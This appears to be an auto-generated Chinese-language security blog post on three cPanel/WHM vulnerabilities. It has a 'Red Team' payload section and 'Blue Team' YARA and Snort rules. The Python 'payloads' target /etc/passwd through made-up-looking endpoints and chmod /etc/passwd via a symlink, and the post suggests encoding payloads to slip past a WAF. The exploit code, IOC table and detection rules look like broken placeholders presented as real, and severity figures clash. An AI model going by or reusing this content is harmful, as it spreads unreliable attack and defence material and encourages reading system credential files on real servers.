---
layout: post
title:  "cPanel, WHM Release Fixes for Three New Vulnerabilities — Patch Now"
date:   2026-05-09 13:00:28 +0000
categories: [security]
severity: high
---

# 🔥 解析 cPanel 和 Web Host Manager (WHM) 的三個漏洞：CVE-2026-29201、CVE-2026-29202 和 CVE-2026-29203

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：4.3、8.8、8.8)
> * **受駭指標**: Arbitrary File Read、Remote Code Execution (RCE) 和 Denial-of-Service (DoS)
> * **關鍵技術**: Insufficient Input Validation、Arbitrary Perl Code Execution 和 Symlink Handling Vulnerability

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 
    + CVE-2026-29201：`feature::LOADFEATUREFILE` adminbin 呼叫中，對 feature 文件名稱的輸入驗證不充分，導致任意文件讀取。
    + CVE-2026-29202：`create_user API` 呼叫中，對 `plugin` 參數的輸入驗證不充分，導致任意 Perl 代碼執行。
    + CVE-2026-29203：symlink 處理漏洞，允許用戶修改任意文件的存取權限，導致 DoS 或可能的權限提升。
* **攻擊流程圖解**:
    + CVE-2026-29201：`User Input -> feature::LOADFEATUREFILE -> File Read`
    + CVE-2026-29202：`User Input -> create_user API -> Plugin Execution -> Perl Code Execution`
    + CVE-2026-29203：`User Input -> Symlink Creation -> Chmod -> File Permission Modification`
* **受影響元件**: cPanel 和 WHM 的多個版本，包括 11.136.0.9 和更高版本、11.134.0.25 和更高版本等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 
    + CVE-2026-29201：需要有 cPanel 或 WHM 的管理員權限。
    + CVE-2026-29202：需要有 cPanel 或 WHM 的管理員權限和 plugin 執行權限。
    + CVE-2026-29203：需要有 cPanel 或 WHM 的用戶權限和文件系統存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
    # CVE-2026-29201
    import requests
    
    url = "https://example.com:2087/feature/LOADFEATUREFILE"
    payload = {"feature_file": "/etc/passwd"}
    response = requests.post(url, data=payload)
    
    # CVE-2026-29202
    import requests
    
    url = "https://example.com:2087/create_user"
    payload = {"plugin": "exploit_plugin"}
    response = requests.post(url, data=payload)
    
    # CVE-2026-29203
    import os
    
    symlink_path = "/tmp/symlink"
    target_path = "/etc/passwd"
    os.symlink(target_path, symlink_path)
    os.chmod(symlink_path, 0o777)
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 URL 編碼或 Base64 編碼來隱藏 payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /etc/passwd |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule cpanel_vulnerability {
        meta:
            description = "cPanel Vulnerability Detection"
            author = "Your Name"
        strings:
            $a = "feature::LOADFEATUREFILE"
            $b = "create_user API"
            $c = "symlink"
        condition:
            any of them
    }
    
    ```
 

```

snort
alert tcp any any -> any 2087 (msg:"cPanel Vulnerability Detection"; content:"feature::LOADFEATUREFILE"; sid:1000001;)

```
* **緩解措施**: 
    + 更新 cPanel 和 WHM 到最新版本。
    + 限制管理員權限和 plugin 執行權限。
    + 監控文件系統存取權限和變化。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Insufficient Input Validation (輸入驗證不充分)**: 想像一個沒有檢查邊界的輸入框。技術上是指應用程式沒有正確驗證用戶輸入的資料，導致攻擊者可以注入惡意代碼或資料。
* **Arbitrary Perl Code Execution (任意 Perl 代碼執行)**: 想像一個可以執行任意 Perl 代碼的後門。技術上是指攻擊者可以執行任意 Perl 代碼，導致系統權限提升或資料泄露。
* **Symlink Handling Vulnerability (symlink 處理漏洞)**: 想像一個可以修改任意文件存取權限的漏洞。技術上是指應用程式沒有正確處理 symlink，導致攻擊者可以修改任意文件的存取權限。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/cpanel-whm-patch-3-new-vulnerabilities.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


